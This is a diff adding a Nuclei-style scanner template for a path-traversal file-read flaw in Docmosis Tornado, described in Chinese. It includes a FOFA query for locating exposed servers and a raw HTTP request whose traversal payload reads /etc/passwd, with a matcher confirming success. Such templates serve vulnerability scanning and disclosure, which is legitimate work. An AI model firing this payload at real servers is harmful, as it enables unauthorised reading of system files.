@@ -1,0 +1,27 @@
+id: docmosis-tornado-filename-fileread
+
+info:
+  name: docmosis-tornado-filename-fileread
+  author: unknow
+  severity: high
+  description: 龙卷风科技 cms 存在文件读取漏洞。
+  tags: docmosis,fileread
+  metadata:
+    fofa-qeury: body="WebServerDownload.css" || body="Welcome to Docmosis Web Services"
+
+http:
+  - raw:
+      - |              
+        GET /api/../fetch?filename={{fileread}} HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 
+
+    payloads:
+      fileread:
+        - "/../../../../../etc/passwd"
+
+    matchers:     
+      - type: dsl
+        name: fileread
+        dsl:
+          - '(status_code==200 )  && contains(body, "root:") && contains(header, "application/zip")'
